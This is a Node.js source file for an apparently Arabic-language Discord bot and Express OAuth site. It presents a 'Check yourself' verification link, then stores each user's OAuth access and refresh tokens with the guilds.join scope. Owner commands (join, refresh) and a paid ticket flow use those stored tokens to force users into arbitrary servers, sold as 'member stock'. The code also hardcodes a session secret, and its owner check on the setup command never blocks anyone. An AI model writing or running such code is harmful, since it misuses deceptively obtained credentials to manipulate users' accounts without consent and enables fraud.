const { Intents  , Client , MessageActionRow, MessagePayload  , MessageSelectMenu ,Modal , MessageEmbed  ,MessageButton , MessageAttachment, Permissions, TextInputComponent } = require('discord.js');
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES
  ]
});

var express = require("express");
var app = express();
var path = require("path");
var bodyParser = require("body-parser");
const Database = require('st.db')
const usersdata = new Database({
  path: './database/users.json',
  databaseInObject: true
})
const DiscordStrategy = require('passport-discord').Strategy
  , refresh = require('passport-oauth2-refresh');
const passport = require('passport');
const session = require('express-session');
const wait = require('node:timers/promises').setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));
const config = require("./config.js");
const { use } = require("passport");
global.config = config;
import('node-fetch')
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

require('./slash.js')
app.get('/', function (req, res) {
  res.send('Hello World')
})
const prefix = config.bot.prefix; 

app.listen(3000)
var scopes = ['identify', 'guilds', 'guilds.join'];

passport.use(new DiscordStrategy({
  clientID: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  callbackURL: config.bot.callbackURL,
  scope: scopes
}, async function (accessToken, refreshToken, profile, done) {
  process.nextTick(async function () {
    usersdata.set(`${profile.id}`, {
      accessToken: accessToken,
      refreshToken: refreshToken,
      email: profile.email
    })
    return done(null, profile);
  });
  await oauth.addMember({
    guildId: `${config.bot.GuildId}`,
    userId: profile.id,
    accessToken: accessToken,
    botToken: client.token
  })

}));



app.get("/", function (req, res) {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});



app.use(session({
  secret: 'some random secret',
  cookie: {
    maxAge: 60000 * 60 * 24
  },
  saveUninitialized: false
}));
app.get("/", (req, res) => {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
  var characters = '0123456789';
  let idt = ``
  for (let i = 0; i < 20; i++) {
    idt += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  res.render("login", { client: client, user: req.user.username, config: config, bot: bot });
});
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`Check yourself اثبت نفسك `)
      .setStyle(`LINK`)
      .setURL(`${config.bot.TheLinkVerfy}`)
      .setEmoji(`✅`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `invite`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`invite ضيفني`)
      .setStyle(`LINK`)
      .setURL(config.bot.inviteBotUrl)
      .setEmoji(`✍️`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب mention user**` });
    let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط error user **` });
    let data = usersdata.get(`${member.id}`)
    if (data) return message.channel.send({ content: `**موثق بالفعل virifyed user**` });
    if (!data) return message.channel.send({ content: `**غير موثق not virifyed **` });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص .. Checking in progress **` })
    let alld = usersdata.all()
    let args = message.content.split(` `).slice(1)
    if (!args[0] || !args[1]) return msg.edit({ content: `** pls server id  عذرًا , يرجى تحديد خادم ..**` }).catch(() => { message.channel.send({ content: `**server id pls عذرًا , يرجى تحديد خادم ..**` }) });
    let guild = client.guilds.cache.get(`${args[0]}`)
    let amount = args[1]
    let count = 0
    if (!guild) return msg.edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم .. not sserver or i am not in server **` }).catch(() => { message.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
    if (amount > alld.length) return msg.edit({ content: `**لا يمكنك ادخال هاذا العدد ..u can **` }).catch(() => { message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد .. u cant**` }) });;
    for (let index = 0; index < amount; index++) {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[index].ID,
        accessToken: alld[index].data.accessToken,
        botToken: client.token
      }).then(() => {
        count++
      }).catch(() => { })
    }
    msg.edit({
      content: `** DONE تم بنجاح ..**
**تم ادخال users join ** \`${count}\`
**لم اتمكن من ادخال not join ** \`${amount - count}\`
**تم طلب chek ** \`${amount}\``
    }).catch(() => {
      message.channel.send({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
      })
    });;
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel.send({ content: `**جاري عمل ريفريش .. refrch **` }).catch(() => { })
    let alld = usersdata.all()
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth.tokenRequest({
        'clientId': client.user.id,
        'clientSecret': bot.clientSECRET,
        'grantType': 'refresh_token',
        'refreshToken': alld[i].data.refreshToken
      }).then((res) => {
        usersdata.set(`${alld[i].ID}`, {
          accessToken: res.access_token,
          refreshToken: res.refresh_token
        })
        count++
      }).catch(() => {
        usersdata.delete(`${alld[i].ID}`)
      })
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``
    }).catch(() => {
      message.channel.send({ content: `**تم بنجاح .. ${count}**` }).catch(() => { })
    })
  }
})

client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `stock_member`)) {

    let alld = usersdata.all();

    const embed = new MessageEmbed()
      .setTitle('Stock Member')
      .setDescription('My Stock is ' + alld.length) 
      .setImage('')
      .setColor('#f5ad4d'); // يمكنك تغيير لون الإيمبد حسب احتياجك

    message.reply({ embeds: [embed] });
  }
});


client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `users`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let alld = usersdata.all()
    message.reply({ content: `**WE HAVE ${alld.length}**` })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `help`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    message.reply({
      content: `**[\`&join {ServerId} {amount}\`]**
**[\`${prefix}refresh\`]**
**[\`${prefix}users\`]**
**[\`${prefix}help\`]**
**[\`${prefix}check\`]**
**[\`${prefix}invite\`]**
**[\`${prefix}send\`]**
    `})
  }
})
var listeners = app.listen(3004, function () {
  console.log("Your app is listening on port " + `3004`)
});

client.on('ready', () => {
  console.log(`Bot is On! ${client.user.tag}`);
});
client.login(process.env.midd);
const { AutoKill } = require('autokill')
AutoKill({ Client: client, Time: 5000 })

process.on("unhandledRejection", error => {
  console.log(error)
});


client.on(`interactionCreate` , interaction => {
  if (!interaction.isCommand())return ;
  if (interaction.commandName == 'setup'){

    
    if (!interaction.user.id == config.bot.owners) return ;


    
   const channel = interaction.channel.id ; 

   const Channel = interaction.guild.channels.cache.get(channel); 
    const embed = new MessageEmbed()
    .setDescription('To buy members, you must open a ticket first')
.setImage('https://media.discordapp.net/attachments/1220370611285659788/1220411065234624644/mGHXi2pg_-_Copie.png')
    
    const row = new MessageActionRow().addComponents(
      new MessageButton()
      .setCustomId('openticket')
      .setLabel('Order')
      .setStyle('SUCCESS')
      .setEmoji('<:addgreen:1220412893636460627>'), 

      new MessageButton()
          .setLabel('Add')
          .setStyle('LINK')
      .setURL(config.bot.inviteBotUrl)
    .setEmoji('<:members:1220412896950091826>')
      );


    Channel.send({embeds : [embed] , components : [row]})

    interaction.reply({content : `DONE MAKE تم ارسال التكت بنجاح` , ephemeral : true})
// By mi.dd discord

  }
})
client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton()) return; 
  if (interaction.customId == 'openticket'){

    const ceatogry = await interaction.guild.channels.cache.get(config.bot.ceatogry)


    const ChannelSpin = await interaction.guild.channels.create(`''${interaction.user.username}` , {
      type : 'GUILD_TEXT' , 
      parent : ceatogry , 
      permissionOverwrites : [

       {
         id: interaction.guild.roles.everyone.id,
         deny: ['VIEW_CHANNEL']
       },
       {
         id: interaction.user.id,
         allow: ['VIEW_CHANNEL']
       },
      ]

       })








    const embed = new MessageEmbed()
    .setTitle('شراء اعضاء')
      .setDescription('خطوات العمل ضيف البوت عن طريق زر Add بعد ماتضيف البوت اضغط زر Buy عبي البيانات والبيع كله تلقائي لاتمنشن حد')  

    const row = new MessageActionRow().addComponents(
      new MessageButton()
      .setCustomId('buyMembers')
      .setLabel('Buy')
      .setStyle('PRIMARY') 
    .setEmoji('<:addgreen:1220412893636460627>'),

      new MessageButton()
      .setCustomId('closeTicket')
      .setLabel('Close')
      .setStyle('DANGER'), 

      new MessageButton()
        .setLabel('Add')
        .setStyle('LINK')
        .setURL(config.bot.inviteBotUrl)
        .setEmoji('<:members:1220412896950091826>')
    );

await ChannelSpin.send({content : `${interaction.user}` , embeds : [embed] , components : [row]})

await interaction.reply({content : `تم انشاء تذكرة شراء الاعضاء `, ephemeral : true})



  }
})


client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton())return ; 
  if (interaction.customId == 'buyMembers'){

    const BuyModal = new Modal()
    .setCustomId('BuyModal')
    .setTitle('شراء اعضاء');
  const Count = new TextInputComponent()
    .setCustomId('Count')
    .setLabel("عدد الاعضاء")
    .setMinLength(1)
    .setMaxLength(5)
    .setStyle('SHORT'); 

    const serverid = new TextInputComponent()
    .setCustomId('serverid')
    .setLabel("ايدي السيرفير")
    .setMinLength(1)
    .setMaxLength(22)
    .setStyle('SHORT'); 


  const firstActionRow = new MessageActionRow().addComponents(Count);
  const firstActionRow2 = new MessageActionRow().addComponents(serverid);


  BuyModal.addComponents(firstActionRow , firstActionRow2);

  await interaction.showModal(BuyModal);


  } else if (interaction.customId == 'closeTicket'){

    interaction.reply(`سيتم حذف التذكرة بعد قليل`)
   setTimeout(() => {
  interaction.channel.delete();
}, 5000);


  }
})


client.on(`interactionCreate` ,async interaction => {
  if (!interaction.isModalSubmit())return ;
  if (interaction.customId == 'BuyModal'){


    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = config.bot.Price; 

    const result = Count * price; 
    const tax = Math.floor(result * (20 / 19) + 1);

    let alld = usersdata.all()

    let guild = client.guilds.cache.get(`${serverid}`)
    let amount = Count
    let count = 0
    if (!guild) return interaction.reply({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }).catch(() => { interaction.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
    if (amount > alld.length) return interaction.reply({ content: `**لا يمكنك ادخال هاذا العدد ..**` }).catch(() => { interaction.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` }) });;

    await interaction.reply({ content: `#credit ${config.bot.TraId} ${tax}` });


    const filter = ({ content, author: { id } }) => {
        return (
            content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
            content.includes(config.bot.TraId) &&
            id === "282859044593598464" &&
            (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
        );
    };

    const collector = interaction.channel.createMessageCollector({
        filter,
        max: 1,
    });

    collector.on('collect', async collected => {


  await interaction.deleteReply();

      let msg = await interaction.channel.send({ content: `**جاري الفحص ..**` })

      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++
        }).catch(() => { })
      }
      msg.edit({
        content: `**تم بنجاح ..**
  **تم ادخال** \`${count}\`
  **لم اتمكن من ادخال** \`${amount - count}\`
  **تم طلب** \`${amount}\``
      }).catch(() => {
        message.channel.send({
          content: `**تم بنجاح ..**
  **تم ادخال** \`${count}\`
  **لم اتمكن من ادخال** \`${amount - count}\`
  **تم طلب** \`${amount}\``
        })
      });;

    });


  }
})